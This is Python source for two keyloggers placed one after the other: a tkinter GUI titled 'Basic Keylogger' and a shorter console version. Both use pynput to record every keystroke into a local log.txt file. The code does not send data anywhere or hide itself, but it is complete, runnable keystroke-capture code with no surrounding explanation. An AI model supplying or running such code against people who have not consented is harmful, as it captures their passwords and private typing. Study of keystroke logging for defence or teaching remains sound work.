
from pynput import keyboard
import tkinter as tk
import threading

log_file = "log.txt"
listener = None

# Function to log keys
def keyPressed(key):
    with open(log_file, 'a') as f:
        try:
            f.write(key.char)
        except:
            f.write(f"[{key}]")

# Start logging in a thread
def start_logging():
    global listener
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    status_label.config(text="Logging started...")

# Stop logging
def stop_logging():
    global listener
    if listener:
        listener.stop()
        status_label.config(text="Logging stopped.")

# View logs in a popup window
def view_logs():
    with open(log_file, 'r') as f:
        data = f.read()
    log_win = tk.Toplevel(root)
    log_win.title("Keystroke Log")
    text_box = tk.Text(log_win, height=20, width=60)
    text_box.insert(tk.END, data)
    text_box.pack()

# GUI setup
root = tk.Tk()
root.title("Basic Keylogger")
root.geometry("300x200")

tk.Button(root, text="Start Logging", command=start_logging).pack(pady=5)
tk.Button(root, text="Stop Logging", command=stop_logging).pack(pady=5)
tk.Button(root, text="View Logs", command=view_logs).pack(pady=5)

status_label = tk.Label(root, text="Status: Idle")
status_label.pack(pady=10)

root.mainloop()
from pynput import keyboard

def keyPressed(key):
    print(str(key))
    with open("log.txt", 'a') as logKey:
        try:
            char = key.char
            logKey.write(char)
        except:
            print("Error grtting char")

if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    input()

